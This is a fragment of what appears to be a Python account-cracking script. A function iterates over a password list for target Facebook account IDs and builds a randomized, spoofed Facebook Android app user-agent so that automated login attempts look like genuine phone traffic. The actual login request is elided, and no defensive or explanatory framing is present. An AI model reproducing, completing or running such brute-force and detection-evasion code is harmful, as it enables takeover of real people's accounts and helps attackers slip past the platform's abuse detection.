...
def rd1(ids,passlist):
	try:
		...
		for pas in passlist:
				...
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,999)) +";FBBV/"+str(random.randint(1111111,7777779))+";FBRV/"+str(random.randint(111111111,777777777))+";[FBAN/FB4A;FBAV/300.0.0.4.45;FBBV/269235091;FBDM/{density=2.8812501,width=1080,height=2110};FBLC/en_US;FBRV/328443150;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/23076RA4BC;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
